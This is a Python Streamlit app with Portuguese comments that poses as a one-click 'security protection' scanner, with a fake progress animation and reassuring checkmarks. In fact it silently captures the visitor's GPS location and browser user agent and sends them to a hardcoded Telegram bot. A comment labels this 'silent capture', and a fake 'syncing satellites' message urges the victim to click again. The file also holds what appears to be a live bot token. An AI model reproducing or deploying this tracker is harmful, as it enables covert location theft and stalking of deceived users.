import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO DIRETA TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

# 2. CONFIGURAÇÃO E VISUAL (IDÊNTICO AO VÍDEO)
st.set_page_config(page_title="Sistema de Segurança", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-container { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .sphere {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct { font-size: 45px; font-weight: bold; color: white; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.8em;
        border-radius: 10px; border: none !important; cursor: pointer;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA SILENCIOSA (O PULO DO GATO PARA O 1 CLIQUE)
# Capturamos o GPS fora de qualquer condicional para ele começar a carregar IMEDIATAMENTE
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL')
# get_geolocation sem 'key' dinâmica para evitar o TypeError das fotos
loc = get_geolocation() 

# 4. INTERFACE PRINCIPAL
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
espaco_bola = st.empty()

# Mostra os 4% iniciais do vídeo
with espaco_bola.container():
    st.markdown('<div class="scanner-container"><div class="sphere"><div class="pct">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. O BOTÃO DE 1 CLIQUE
if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc and 'coords' in loc:
        # Se o GPS já carregou (1 clique), faz a animação subir rápido e envia
        for p in [22, 48, 71, 93, 100]:
            espaco_bola.markdown(f'<div class="scanner-container"><div class="sphere"><div class="pct">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.1)
        
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ SISTEMA ATIVADO\n"
            f"📱 {ua[:40] if ua else 'Android/iOS'}\n"
            f"📍 [LOCALIZAÇÃO NO MAPA]({mapa})"
        )
        enviar_telegram(relatorio)
        st.success("✅ Proteção Ativada!")
    else:
        # Se o usuário for muito rápido e o navegador ainda estiver processando o GPS
        st.warning("⚠️ Sincronizando satélites... Aguarde 1 segundo e clique novamente.")

st.markdown('<p style="text-align:center; color:#444; margin-top:40px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
